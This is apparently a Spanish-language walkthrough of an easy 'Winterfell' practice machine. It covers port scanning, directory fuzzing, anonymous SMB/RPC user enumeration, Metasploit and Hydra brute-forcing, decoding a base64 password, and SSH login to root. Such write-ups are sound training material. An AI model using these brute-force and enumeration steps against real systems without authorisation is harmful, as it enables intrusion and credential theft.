# 🧊 Máquina: Winterfell

**Nivel:** Fácil

**Descripción:**
Winterfell es una máquina vulnerable de nivel fácil orientada a pruebas de intrusión en un entorno controlado. El objetivo es comprometer el sistema identificando vulnerabilidades a través de diversos vectores y técnicas, desde el reconocimiento inicial hasta la escalada de privilegios.

**Objetivo:**
Obtener acceso como usuario privilegiado (root) explotando debilidades en los servicios expuestos de la máquina.

> **Nota:** Durante la práctica, la máquina presentó inconsistencias en su comportamiento (por ejemplo, páginas que no cargaban correctamente y problemas al interactuar con el servicio SSH), lo cual requirió reiniciar el entorno varias veces y adaptar los procedimientos al entorno real.

---

## 🔧 Despliegue de la Máquina

Se descarga y despliega la máquina con los siguientes comandos:

```bash
unzip winterfell.zip
sudo bash auto_deploy.sh winterfell.tar
```

![](/Winterfell/Imagenes/Logo.png)
![](/Winterfell/Imagenes/Inicio.jpeg)

Verificamos conectividad con un `ping`:

```bash
ping -c 4 172.17.0.2
```

![](/Winterfell/Imagenes/Ping.jpeg)

---

## 🔍 Escaneo de Puertos

Realizamos un escaneo completo de puertos para identificar los servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Puertos abiertos detectados:

* **22/tcp** – SSH
* **80/tcp** – HTTP
* **139/tcp**, **445/tcp** – Servicios SMB/NetBIOS

![](/Winterfell/Imagenes/Puertos.jpeg)

Usamos un script personalizado para extraer los puertos relevantes:

```bash
extractPorts allPorts.txt
```

Escaneo con detección de versiones y scripts NSE:

```bash
nmap -sC -sV -p 22,80,139,445 172.17.0.2 -oN target.txt
```

![](/Winterfell/Imagenes/Servicios.jpeg)

---

## 🌐 Análisis del Servicio Web (HTTP)

Accedemos al sitio web en el puerto 80. Inicialmente no cargaba correctamente, por lo que fue necesario reiniciar la máquina varias veces.

![](/Winterfell/Imagenes/Pagina.jpeg)

Al inspeccionar el código fuente, se identifican nombres que podrían estar relacionados con usuarios del sistema:

![](/Winterfell/Imagenes/CodigoFuente.jpeg)

---

## 🧭 Fuzzing de Directorios

Utilizamos **Gobuster** para descubrir directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

Se encuentra el directorio `/dragon`:

![](/Winterfell/Imagenes/Gobuster.jpeg)

Dentro se encuentran referencias a temporadas de una serie, posiblemente útiles como contraseñas:

![](/Winterfell/Imagenes/Directorio.jpeg)
![](/Winterfell/Imagenes/Contraseñas.jpeg)

Guardamos posibles usuarios y contraseñas en archivos `usuarios.txt` y `contraseña.txt`.

![](/Winterfell/Imagenes/Librerias.jpeg)

---

## 📁 Enumeración de Recursos SMB

Enumeramos los recursos compartidos con:

```bash
smbclient -L 172.17.0.2 -N
```

![](/Winterfell/Imagenes/Compartido.jpeg)

---

### 🔧 Análisis del Servicio RPC (SMB)

Se utilizó el comando:

```bash
rpcclient -U "" -N 172.17.0.2
```

Luego, ejecutamos:

```bash
enumdomusers
```

Esto nos muestra usuarios del dominio, entre ellos **jon**.

> **🛠 Explicación técnica:**
> `rpcclient` permite interactuar con el servicio RPC de SMB en Windows/Linux. Al usar `-U ""` y `-N`, se accede de forma anónima. El comando `enumdomusers` permite enumerar usuarios del dominio, útil para ataques de fuerza bruta u obtención de acceso.

![](/Winterfell/Imagenes/Usuario.jpeg)

---

### 📂 Acceso al recurso SMB como usuario

Conectamos al recurso compartido `shared` usando el usuario **jon**:

```bash
smbclient -U 'jon' //172.17.0.2/shared
```

Descargamos el archivo disponible:

```bash
get proteccion_del_reino
```

![](/Winterfell/Imagenes/smbdescarga.jpeg)
![](/Winterfell/Imagenes/smbls.jpeg)

---

## 🛠 Uso de Metasploit para SMB Login Bruteforce

Utilizamos el módulo de Metasploit `auxiliary/scanner/smb/smb_login` para forzar inicio de sesión SMB:

Configuración del módulo:

```
set RHOSTS 172.17.0.2
set SMBUser jon
set PASS_FILE /ruta/a/contraseña.txt
set THREADS 10
```

Resultado exitoso:

```
[+] 172.17.0.2:445 - Success: .\jon:seacercaelinvierno
```

![](/Winterfell/Imagenes/Metaexploit.jpeg)

---

## 🔐 Extracción y Decodificación de Contraseña

El archivo descargado contenía una cadena en base64:

```bash
cat proteccion_del_reino
echo "aGlqb2RlbGFuaXN0ZXI=" | base64 --decode
```

Resultado:

```text
hijodelanister
```

![](/Winterfell/Imagenes/Cat.jpeg)
![](/Winterfell/Imagenes/Bash64.jpeg)

---

## 🐍 Ataque de Fuerza Bruta a SSH

Con usuarios y contraseña decodificada:

```bash
hydra -L usuarios.txt -p hijodelanister ssh://172.17.0.2
```

Se obtiene acceso exitoso con:

* **Usuario:** jon
* **Contraseña:** hijodelanister

![](/Winterfell/Imagenes/Hydra.jpeg)

---

## 🔑 Acceso a la Máquina vía SSH

Ingresamos al sistema:

```bash
ssh jon@172.17.0.2
```

Verificamos permisos sudo:

```bash
sudo -l
```

Se logra escalada de privilegios hasta `root`.

![](/Winterfell/Imagenes/SSH.jpeg)
![](/Winterfell/Imagenes/root.jpeg)

---

## 🏁 Conclusión

Durante el análisis de la máquina **Winterfell**, se identificaron múltiples vectores de ataque:

* Enumeración efectiva de servicios web y SMB.
* Exposición de archivos con contraseñas en texto plano.
* Uso de herramientas como Gobuster, SMBClient, Metasploit y Hydra para automatizar y forzar accesos.
* Decodificación de información sensible y acceso al sistema vía SSH.

A pesar de los inconvenientes técnicos presentados, se logró cumplir con el objetivo de obtener acceso como superusuario (root), evidenciando la importancia de una configuración segura de servicios y la protección de información sensible.

